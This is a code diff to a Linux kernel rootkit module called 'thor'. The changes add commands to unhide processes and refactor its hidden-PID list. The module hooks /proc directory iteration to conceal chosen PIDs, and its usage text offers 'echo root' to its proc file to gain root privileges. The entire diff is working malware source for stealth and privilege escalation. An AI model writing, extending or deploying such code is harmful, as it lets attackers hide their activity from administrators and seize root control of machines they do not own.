@@ -28,6 +28,9 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer, size
 static void procfile_cleanup(void);
 static int thor_proc_iterate(struct file *file, struct dir_context *ctx);
 static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+static void add_to_pid_list(const char *name, unsigned int len);
+static void remove_from_pid_list(const char *name, unsigned int len);
+static void clear_pid_list(void);
 // ------------------------------------------------------------ DEFINITIONS
 struct _pid_list {
     char *name;
@@ -112,6 +115,8 @@ static int procfile_read(struct seq_file *m, void *v)
     seq_printf(m, 
         "usage:\n"\
         "   echo hpPID > /proc/" THOR_PROCFILE " (hides process PID)\n"\
+        "   echo upPID > /proc/" THOR_PROCFILE " (unhides process PID)\n"\
+        "   echo upa > /proc/" THOR_PROCFILE " (unhide all PIDs)\n"\
         "   echo root > /proc/" THOR_PROCFILE " (gain root privileges)\n");
     return 0;
 }
@@ -124,14 +129,17 @@ static int procfile_open(struct inode *inode, struct file *file)
 static ssize_t procfile_write(struct file *file, const char __user *buffer,
         size_t count, loff_t *ppos)
 {
-    struct _pid_list *tmp;
     if(0 == strncmp(buffer, "hp", MIN(2, count)))
     {
-        tmp = (struct _pid_list*)kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
-        tmp->name = (char*)kmalloc(count-2, GFP_KERNEL);
-        memcpy(tmp->name, buffer+2, count-2);
-        tmp->name[count-3] = 0;
-        list_add(&(tmp->list), &(pid_list.list));
+        add_to_pid_list(buffer+2, count-2);
+    }
+    else if(0 == strncmp(buffer, "upa", MIN(3, count)))
+    {
+        clear_pid_list();
+    }
+    else if(0 == strncmp(buffer, "up", MIN(2, count)))
+    {
+        remove_from_pid_list(buffer+2, count-2);
     }
     else if(0 == strncmp(buffer, "root", MIN(4, count)))
     {
@@ -172,12 +180,52 @@ static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t of
     return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
 }
 
-// ------------------------------------------------------------ CLEANUP
-static void __exit thor_cleanup(void)
+// ------------------------------------------------------------ PIDLIST
+static void add_to_pid_list(const char *name, unsigned int len)
+{
+    struct _pid_list *tmp;
+
+    tmp = (struct _pid_list*)kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
+    tmp->name = (char*)kmalloc(len, GFP_KERNEL);
+    memcpy(tmp->name, name, len);
+    tmp->name[len-1] = 0;
+
+    list_add(&(tmp->list), &(pid_list.list));
+}
+
+static void remove_from_pid_list(const char *name, unsigned int len)
 {
     struct _pid_list *tmp;
     struct list_head *pos, *q;
 
+    list_for_each_safe(pos, q, &(pid_list.list))
+    {
+        tmp = list_entry(pos, struct _pid_list, list);
+        if(0 == strncmp(tmp->name, name, len-1))
+        {
+            list_del(pos);
+            kfree(tmp->name);
+            kfree(tmp);
+        }
+    }
+}
+
+static void clear_pid_list(void)
+{
+    struct _pid_list *tmp;
+    struct list_head *pos, *q;
+
+    list_for_each_safe(pos, q, &(pid_list.list))
+    {
+        tmp = list_entry(pos, struct _pid_list, list);
+        list_del(pos);
+        kfree(tmp->name);
+        kfree(tmp);
+    }
+}
+// ------------------------------------------------------------ CLEANUP
+static void __exit thor_cleanup(void)
+{
     procfile_cleanup();
 
     if(NULL != proc_fops && NULL != orig_proc_iterate)
@@ -187,13 +235,7 @@ static void __exit thor_cleanup(void)
         set_addr_ro(proc_fops);
     }
 
-    list_for_each_safe(pos, q, &(pid_list.list))
-    {
-        tmp = list_entry(pos, struct _pid_list, list);
-        list_del(pos);
-        kfree(tmp->name);
-        kfree(tmp);
-    }
+    clear_pid_list();
 
     LOG_INFO("cleanup done");
 }
